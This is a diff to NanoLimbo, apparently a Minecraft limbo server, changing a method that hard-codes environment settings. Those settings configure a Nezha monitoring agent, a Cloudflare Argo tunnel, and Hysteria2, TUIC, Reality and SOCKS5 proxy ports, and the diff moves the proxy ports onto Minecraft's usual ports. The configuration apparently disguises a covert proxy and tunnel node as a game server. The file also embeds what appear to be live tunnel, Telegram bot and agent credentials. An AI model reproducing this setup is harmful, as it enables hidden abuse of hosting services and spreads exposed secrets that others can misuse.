@@ -122,18 +122,18 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "d497d825-6481-45ca-8d42-77e7c0b19f58");
+        envVars.put("UUID", "8d8af95f-1f14-454f-9293-d378e28df7db");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nznz.sss.xx.kg:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "XTXYqxCUxIxcgN1fK9hR2ilwt2NVK8yJ");
         envVars.put("ARGO_PORT", "9123");
-        envVars.put("ARGO_DOMAIN", "na1host-gb.omi.pp.ua");
-        envVars.put("ARGO_AUTH", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiOTEzNjllZWQtZmRlYS00ZmI1LTlmNDMtZDE5NzQxYTMxM2IwIiwicyI6Ims4VHRxTGxkQ3ZxblVnTHFiRlNwcEZldDFRYmlnalM1R2hlYTArUVVlL289In0=");
-        envVars.put("HY2_PORT", "30587");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "");
-        envVars.put("S5_PORT", "30587");
+        envVars.put("ARGO_DOMAIN", "xservergame4.yvy.pp.ua");
+        envVars.put("ARGO_AUTH", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiOWEzMWIwZmYtMWRlZS00MmRjLTg0MGMtN2QxNmVhYWY1ZWE4IiwicyI6IlpsWit6eVRWb1NkQlJPeUoxU2h2bXNlWlk2YWxkWndUQmVoTVFEQk5vTTQ9In0=");
+        envVars.put("HY2_PORT", "25565");
+        envVars.put("TUIC_PORT", "25575");
+        envVars.put("REALITY_PORT", "25575");
+        envVars.put("S5_PORT", "25565");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -141,7 +141,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "na1host");
+        envVars.put("NAME", "XServer-Game-4");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -208,6 +208,7 @@ public final class NanoLimbo {
     }
 
 }
+
 
 
 
